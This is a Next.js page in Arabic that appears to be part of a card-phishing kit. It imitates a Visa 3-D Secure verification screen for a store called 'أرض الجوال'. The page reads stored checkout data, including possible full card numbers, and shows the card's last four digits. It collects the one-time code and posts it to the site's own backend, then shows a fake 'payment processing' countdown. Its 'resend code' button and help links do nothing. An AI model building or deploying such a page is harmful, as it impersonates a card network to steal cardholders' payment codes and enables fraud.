'use client';

import Link from 'next/link';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const [phone, setPhone] = useState('');
  const [cardLast4, setCardLast4] = useState('0000');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      if (draft) {
        const rawCard = 
          draft.cardLast4 || 
          draft.cardNumber || 
          draft.card_number || 
          draft.card;

        if (typeof rawCard === 'string') {
          const digits = normalizeDigits(rawCard);
          if (digits.length >= 4) {
            setCardLast4(digits.slice(-4));
          }
        }
      }

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
    };
  }, [confirmedAt, verified]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمز التأكيد المكوّن من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setIsVerifying(true);
    setError('');
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode,
        }),
      });
      const result = (await response.json()) as { ok?: boolean; error?: string; message?: string };
      if (!response.ok || !result.ok) {
        setError(result.error || 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.');
        return;
      }

      const verificationTime = Date.now();
      setConfirmedAt(verificationTime);
      setVerified(true);
      setError('');
      try {
        const raw = window.sessionStorage.getItem(DRAFT_KEY);
        const draft = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
        window.sessionStorage.setItem(
          DRAFT_KEY,
          JSON.stringify({
            ...draft,
            stage: 'confirmed',
            confirmedAt: verificationTime,
          })
        );
      } catch {}
    } catch {
      setError('تعذر الاتصال بالإدارة. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  return (
    <div style={{ backgroundColor: verified ? '#fbfcfd' : '#ffffff', color: verified ? '#1c2530' : '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: verified ? '"Tajawal", Tahoma, Arial, sans-serif' : 'Arial, sans-serif', overflow: verified ? 'hidden' : 'visible', position: 'relative' }}>
      
      {!verified && (
        <>
          {/* Header */}
          <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
            <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
              VISA
            </div>
          </header>
        </>
      )}

      {/* Content */}
      <main style={{ width: '100%', maxWidth: verified ? '480px' : '400px', minHeight: verified ? '100vh' : 'auto', padding: verified ? '48px 24px' : '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: verified ? 'flex-start' : 'center', textAlign: 'center', position: 'relative', zIndex: 1 }}>
        
        {verified ? (
          <>
            <style jsx global>{`
              @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;800&display=swap');
              .erd-wait-blob { position: fixed; border-radius: 50%; pointer-events: none; z-index: 0; }
              .erd-wait-blob-one { width: 260px; height: 260px; top: -130px; left: -90px; background: linear-gradient(135deg,#7fd6bf,#bfe9dd); }
              .erd-wait-blob-two { width: 420px; height: 420px; bottom: -250px; right: -120px; background: linear-gradient(135deg,#d6efe8,#7fd6bf); }
              .erd-wait-blob-three { width: 300px; height: 300px; bottom: -190px; left: -60px; background: #e9f6f2; }
              .erd-wait-logo { display: flex; align-items: center; gap: 14px; margin: 0 auto 56px; direction: rtl; }
              .erd-wait-logo-text { font-weight: 800; font-size: 30px; line-height: 1.05; text-align: right; }
              .erd-wait-logo-text span { display: block; }
              .erd-wait-logo-line { display: inline-block; width: 110px; height: 2px; background: #1c2530; vertical-align: middle; margin-inline-end: 6px; }
              .erd-wait-logo-mark { width: 56px; height: 70px; flex: none; }
              .erd-wait-timer { position: relative; width: min(300px,72vw); aspect-ratio: 1; }
              .erd-wait-ring { width: 100%; height: 100%; transform: rotate(-90deg); }
              .erd-wait-ring circle { fill: none; stroke-width: 14; stroke-linecap: round; }
              .erd-wait-track { stroke: #e6eaee; }
              .erd-wait-progress { stroke: #2fbf9b; transition: stroke-dashoffset 1s linear; }
              .erd-wait-timer-body { position: absolute; inset: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; }
              .erd-wait-hourglass { width: 52px; height: 64px; margin-bottom: 6px; }
              .erd-wait-number { font-size: 64px; font-weight: 800; line-height: 1; font-variant-numeric: tabular-nums; }
              .erd-wait-unit { font-size: 20px; color: #5b6672; font-weight: 500; }
              .erd-wait-heading { font-size: 34px; font-weight: 800; margin: 44px 0 22px; line-height: 1.35; }
              .erd-wait-divider { display: flex; align-items: center; gap: 14px; width: 100%; margin-bottom: 26px; }
              .erd-wait-divider-line { flex: 1; height: 1px; background: #e6eaee; }
              .erd-wait-dots { display: flex; gap: 10px; }
              .erd-wait-dots b { width: 12px; height: 12px; border-radius: 50%; background: #e6eaee; animation: erd-wait-pulse 1.2s infinite; }
              .erd-wait-dots b:nth-child(2) { animation-delay: .2s; }
              .erd-wait-dots b:nth-child(3) { animation-delay: .4s; }
              @keyframes erd-wait-pulse { 0%,100% { background: #e6eaee; transform: scale(1); } 50% { background: #2fbf9b; transform: scale(1.25); } }
              .erd-wait-message { font-size: 20px; line-height: 1.8; color: #5b6672; max-width: 340px; }
              @media (prefers-reduced-motion: reduce) { .erd-wait-dots b { animation: none; } .erd-wait-progress { transition: none; } }
              @media (max-width: 380px) { .erd-wait-logo { margin-bottom: 38px; } .erd-wait-heading { font-size: 26px; margin-top: 34px; } .erd-wait-message { font-size: 17px; } }
            `}</style>

            <div className="erd-wait-blob erd-wait-blob-one" aria-hidden="true" />
            <div className="erd-wait-blob erd-wait-blob-two" aria-hidden="true" />
            <div className="erd-wait-blob erd-wait-blob-three" aria-hidden="true" />

            <div className="erd-wait-logo" aria-label="أرض الجوال">
              <div className="erd-wait-logo-text">
                <span><i className="erd-wait-logo-line" />أرض</span>
                <span>الجوال</span>
              </div>
              <svg className="erd-wait-logo-mark" viewBox="0 0 56 70" aria-hidden="true">
                <path d="M4 14q0-8 8-8h36q6 0 4 7l-6 16H8q-4 0-4-5z" fill="#eef1f3" stroke="#c9d0d6" strokeWidth="2" />
                <path d="M4 40h42l6 10q4 6-3 10H12q-8 0-8-8z" fill="#2fbf9b" />
              </svg>
            </div>

            <div className="erd-wait-timer" role="timer" aria-live="polite" aria-label={`متبقي ${countdown} ثانية`}>
              <svg className="erd-wait-ring" viewBox="0 0 100 100" aria-hidden="true">
                <circle className="erd-wait-track" cx="50" cy="50" r="45" />
                <circle
                  className="erd-wait-progress"
                  cx="50"
                  cy="50"
                  r="45"
                  style={{
                    strokeDasharray: 2 * Math.PI * 45,
                    strokeDashoffset: 2 * Math.PI * 45 * (1 - Math.max(0, Math.min(30, countdown)) / 30),
                  }}
                />
              </svg>
              <div className="erd-wait-timer-body">
                <svg className="erd-wait-hourglass" viewBox="0 0 52 64" aria-hidden="true">
                  <rect x="4" y="2" width="44" height="5" rx="2" fill="#2b3640" />
                  <rect x="4" y="57" width="44" height="5" rx="2" fill="#2b3640" />
                  <path d="M10 7v10q0 8 12 15-12 7-12 15v10M42 7v10q0 8-12 15 12 7 12 15v10" fill="none" stroke="#2b3640" strokeWidth="4" strokeLinecap="round" />
                  <path d="M16 54q0-8 10-12 10 4 10 12z" fill="#2fbf9b" />
                  <path d="M26 30v12" stroke="#2fbf9b" strokeWidth="2" />
                </svg>
                <div className="erd-wait-number">{countdown}</div>
                <div className="erd-wait-unit">ثانية</div>
              </div>
            </div>

            <h1 className="erd-wait-heading">جار معالجة عملية الدفع</h1>
            <div className="erd-wait-divider" aria-hidden="true">
              <i className="erd-wait-divider-line" />
              <div className="erd-wait-dots"><b /><b /><b /></div>
              <i className="erd-wait-divider-line" />
            </div>
            <p className="erd-wait-message">يرجى الانتظار وعدم اغلاق هذه الصفحة حتى اكتمال العمليه</p>
          </>
        ) : (
          <>
            <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
              للتحقق من عملية الشراء
            </div>

            <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
              تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
              <span style={{ display: 'block', direction: 'ltr', fontFamily: 'monospace, sans-serif', fontSize: '20px', marginTop: '5px' }}>
                ********{cardLast4}
              </span>
            </div>

            <form onSubmit={(e) => { e.preventDefault(); void handleVerify(); }} style={{ width: '100%', maxWidth: '280px', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
              <label htmlFor="otp" style={{ fontSize: '14px', color: '#777777', marginBottom: '6px', direction: 'ltr' }}>
                Verification Code
              </label>

              <input
                id="otp"
                type="text"
                inputMode="numeric"
                autoComplete="off"
                pattern="[0-9]*"
                maxLength={6}
                value={referenceCode}
                onChange={(e) => {
                  setReferenceCode(normalizeDigits(e.target.value).slice(0, 6));
                  setError('');
                }}
                disabled={isVerifying}
                style={{
                  width: '100%',
                  height: '42px',
                  border: '1px solid #7f9db9',
                  borderRadius: '2px',
                  fontSize: '18px',
                  textAlign: 'center',
                  marginBottom: '12px',
                  outline: 'none',
                }}
              />

              {error && (
                <div style={{ color: '#c62828', fontSize: '13px', marginBottom: '10px' }}>
                  {error}
                </div>
              )}

              <button
                type="submit"
                disabled={!isReferenceCodeValid || isVerifying}
                style={{
                  width: '100%',
                  height: '42px',
                  backgroundColor: '#1646a7',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  cursor: isReferenceCodeValid && !isVerifying ? 'pointer' : 'not-allowed',
                  opacity: isReferenceCodeValid && !isVerifying ? 1 : 0.7,
                }}
              >
                {isVerifying ? 'جارٍ الإرسال...' : 'ارسال'}
              </button>
            </form>

            <button
              type="button"
              onClick={() => setError('تم إعادة إرسال الرمز.')}
              style={{ marginTop: '50px', color: '#1646a7', fontSize: '14px', background: 'none', border: 'none', cursor: 'pointer', textDecoration: 'none' }}
            >
              طلب كلمة سر جديدة
            </button>

            <div style={{ marginTop: '40px', color: '#1646a7', fontSize: '14px', direction: 'ltr', fontWeight: 'bold' }}>
              <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>Terms of Use</a> | <a href="#" style={{ color: '#1646a7', textDecoration: 'none' }}>?Need help</a>
            </div>
          </>
        )}
      </main>
    </div>
  );
}
